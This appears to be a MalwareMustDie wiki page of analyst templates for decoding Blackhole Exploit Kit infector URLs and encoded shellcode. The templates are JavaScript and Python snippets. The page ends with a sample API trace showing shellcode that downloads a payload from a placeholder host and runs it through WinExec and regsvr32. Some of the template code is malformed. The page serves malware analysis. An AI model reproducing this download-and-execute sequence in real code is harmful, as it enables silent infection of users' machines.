#Decoder template in javascript

# Introduction #

For the usage as per it is

# Details #

**Infector components download URL's decoder**

Just paste the below code into your javascript engine to run it after enter the correct values:
```
// Exploit infector components'url decoder...
// Tested in version 2.x only

function x(s){
  d = [];
  for (i = 0; i < s.length; i ++ ){
    k = (s.charCodeAt(i)).toString(33);
    d.push(k);
  }  ;  return d.join(":");

var domain="http://foo.bar";  // enter BHEK used domain name here.
var pdf ="1k:1d:1f:1d:1g:1d:1f";  // Just use this strings.
var stringn ="PUT THE LONG URL OF PDF OR SWF HERE";
   [...]
var string(n)="PUT THE LONG URL OF PDF OR SWF HERE";

var url1 = domain + string1 + pdf; 
   [...]
var urln = domain + stringn + pdf;
document.write(url1 + "\n" + urln);
} // Output will be burped...
```

**Encoded shellcode's format decoder**

Paste the template in the javascript engine to run it after entering the right values of encoded shellcode:
```
// Plugin detect's encoded shellcode's format decoder...
// Tested in version 2.x only

var shellcode1 = "0000!%0000!%0000!% [...]";
var a = shellcode1.split("").reverse().join("");
var xxx=  a["replace"](/\%!/g, "%" + "u");
document.write(xxx);
// Output will be burped...
```
Translate to binary
```
bin_sc = re.sub('%u(..)(..)',lambda x: chr(int(x.group(2),16))+chr(int(x.group(1),16)), sc)
```
Remove the comment from the lines below in order to
support disassembly of the second stage payload
```
'''
from xortools import single_byte_xor
new_sc  = bin_sc[0:0x1c]
new_sc += single_byte_xor(bin_sc[0x1c:0x1c+0x1b0], 0xf9)
bin_sc = new_sc
'''
```
Save to disk
```
try:
    FILE = open("shellcode.bin", "wb")
    FILE.write(bin_sc)
    FILE.close()
except Exception, e:
    print 'Cannot save binary to disk: %s' % e
```
Disassemble the binary data
```
l = Decode(0, bin_sc, Decode32Bits)
for i in l:
        print "0x%08x (%02x) %-20s %s" % (i[0], i[1], i[3], i[2])
```
As an option, parse bits output into HEX values and feed to the below template with entering the correct values, noted:usual pattern only :
```
0xmmnnnnnn kernel32.VirtualProtect(lpAddress=0x000000, dwSize=255)
0xmmnnnnnn kernel32.LoadLibraryA(lpFileName=urlmon)
0xmmnnnnnn kernel32.GetTempPathA(lpBuffer=0x000000, nBufferLength=(<255), [lpBuffer=%Temp%]) 
0xmmnnnnnn urlmon.URLDownloadToFileA(pCaller=0, szURL=http://x.x.x.x/PAYLOAD-URL, lpfnCB=0x0, szFileName=PAYLOAD.BIN)
0xmmnnnnnn kernel32.WinExec(lpCmdLine=%Temp%\PAYLOAD.BIN, uCmdShow=0) 
0xmmnnnnnn kernel32.WinExec(lpCmdLine=regsvr32 -s %Temp%\PAYLOAD.BIN, uCmdShow=0) 
0xmmnnnnnn kernel32.TerminateThread(dwExitCode=0)
```

#MalwareMustDie